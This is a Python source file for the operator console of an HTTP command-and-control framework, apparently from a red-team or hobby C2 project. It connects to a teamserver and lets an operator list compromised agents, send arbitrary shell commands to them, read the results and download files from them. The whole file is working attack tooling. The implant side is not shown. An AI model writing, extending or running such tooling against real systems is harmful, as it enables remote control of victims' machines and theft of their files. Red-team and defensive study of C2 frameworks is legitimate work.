import cmd
import requests

TEAMSERVER_URL = 'http://192.168.207.1:8000'

class C2CLI(cmd.Cmd):
    prompt = 'HTTP-C2> '

    def do_list_agents(self, arg):
        """List registered agents"""
        url = f'{TEAMSERVER_URL}/agents'
        response = requests.get(url)
        if response.status_code == 200:
            agents = response.json()
            print("Registered Agents:")
            for agent in agents:
                print(f"- Name: {agent['name']}, IP: {agent['ip']}, Type: {agent['type']}")
        else:
            print(f"Failed to retrieve agents: {response.status_code}")

    def do_send_task(self, arg):
        """Send a task to an agent. Usage: send_task <agent_name> <task_type ('command')> <task_data ('pwd' etc.)>"""
        args = arg.split()
        if len(args) < 3:
            print("Usage: send_task <agent_name> <task_type ('command')> <task_data ('pwd' etc.)>")
            return
        agent_name = args[0]
        task_type = args[1]
        task_data = ' '.join(args[2:])
        url = f'{TEAMSERVER_URL}/tasks/{agent_name}'
        data = {
            'type': task_type,
            'data': task_data
        }
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"Task sent successfully to agent '{agent_name}'")
        elif response.status_code == 400:
            print(f"Failed to send task to agent '{agent_name}': Agent terminated")
        else:
            print(f"Failed to send task to agent '{agent_name}': {response.status_code}")

    def do_view_tasks(self, arg):
        """View tasks assigned to an agent. Usage: view_tasks <agent_name>"""
        agent_name = arg
        url = f'{TEAMSERVER_URL}/tasks/{agent_name}'
        data = {
            'type': 'command'
        }
        response = requests.get(url, data=data)
        if response.status_code == 200:
            tasks = response.json()
            print(f"Tasks for agent '{agent_name}':")
            for task in tasks:
                print(f"- Task ID: {task['id']}, Type: {task['type']}, Status: {task['status']}")
        else:
            print(f"Failed to retrieve tasks for agent '{agent_name}': {response.status_code}")

    def do_view_results(self, arg):
        """View results from an agent. Usage: view_results <agent_name>"""
        agent_name = arg
        url = f'{TEAMSERVER_URL}/results/{agent_name}'
        response = requests.get(url)
        if response.status_code == 200:
            results = response.json()
            print(f"Results from agent '{agent_name}':")
            for result in results:
                print(f"- {result}")
        else:
            print(f"Failed to retrieve results from agent '{agent_name}': {response.status_code}")

    def do_download_file(self, arg):
        """Download a file from an agent. Usage: download_file <agent_name> <file_name>"""
        args = arg.split()
        if len(args) != 2:
            print("Usage: download_file <agent_name> <file_name>")
            return
        agent_name, file_name = args
        url = f'{TEAMSERVER_URL}/download/{agent_name}/{file_name}'
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_name, 'wb') as f:
                f.write(response.content)
            print(f"File '{file_name}' downloaded successfully from agent '{agent_name}'")
        else:
            print(f"Failed to download file '{file_name}' from agent '{agent_name}': {response.status_code}")

    def do_exit(self, arg):
        """Exit the CLI"""
        return True

if __name__ == '__main__':
    C2CLI().cmdloop()
